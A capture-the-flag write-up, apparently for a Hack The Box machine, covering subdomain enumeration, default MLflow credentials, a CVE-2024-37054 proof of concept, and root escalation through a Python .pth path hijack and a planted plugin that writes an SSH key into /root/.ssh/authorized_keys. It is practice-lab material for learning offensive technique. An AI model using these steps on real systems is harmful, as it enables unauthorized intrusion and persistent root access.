@@ -1,0 +1,74 @@
+[Profile]{
+Machine: SmartHire 
+ip: 10.129.27.189
+OS: Linux
+}
+
+[Enumeration]{
+nmap -sC -sV 10.129.27.189 -oN nmap_smart
+ |-> http://smarthire.htb
+ffuf -u http://smarthire.htb/ -H "HOST: FUZZ.smarthire.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -fs 178
+  |-> models.smarthire.htb which responds which a status 401 ( let's add it to the /etc/hosts ) and try to connect and it ask us to sign in.
+  ```bash 
+  curl -v http://models.smarthire.htb/
+* Host models.smarthire.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.129.27.189
+*   Trying 10.129.27.189:80...
+* Connected to models.smarthire.htb (10.129.27.189) port 80
+* using HTTP/1.x
+> GET / HTTP/1.1
+> Host: models.smarthire.htb
+> User-Agent: curl/8.14.1
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 401 UNAUTHORIZED
+< Server: nginx/1.18.0 (Ubuntu)
+< Date: Sat, 20 Jun 2026 16:13:46 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 137
+< Connection: keep-alive
+< WWW-Authenticate: Basic realm="mlflow"
+< 
+* Connection #0 to host models.smarthire.htb left intact
+You are not authenticated. Please see https://www.mlflow.org/docs/latest/auth/index.html#authenticating-to-mlflow on how to authenticate.
+```
+}
+
+[Exploitation]{
+we follow the link, and try a bunch of cred given there, the cred is admin:password
+We enter and see it is mlflow 2.14.1, let's check cve and stuff.
+And we find this CVE-2024-37054-PoC which helps us get in nicely.
+
+And we got the user.txt
+}
+
+[PrivEsc]{
+Here, sudo -l and we see we have access this python run:
+``
+And we ls -l that file and see that we have access to it through the devs group we are part of. 
+We inspect the code of mlflow.py and see that it launch plugins, 
+Looking and the plugins folder which is besides mlflow.py, we find out core/ and dev/ and that we have access to dev.
+But we have to take precedence to the core/ to make sure our script get executed and not be overshadowed by core/mlflow_actions.py.
+For that, we go at /opt/tools/mlflow_ctl/plugins/dev 
+  and create the devOverCore.pth to set that 
+  ```vi
+  import sys; sys.path.insert(0, '/opt/tools/mlflow_ctl/plugins/dev')
+  ```
+  and our plugin's actions ( here is where you can set your revshell, your cmd to just read the root.txt or the root sshtake over like this)
+  ```vi
+  import os
+
+  def check_status():
+      os.system("mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAA... user@parrot' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys")
+
+  def restart():
+      os.system("mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAA... user@parrot' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys")
+  ```
+  In the echo, you put your public key that you generate (for example ssh-keygen -f ./smart and in the echo you put the contents of smart.pub )
+    And now you just ssh as root with  `ssh smarthire.htb -l root -i smart`
+
+And we got the root.txt
+
+}
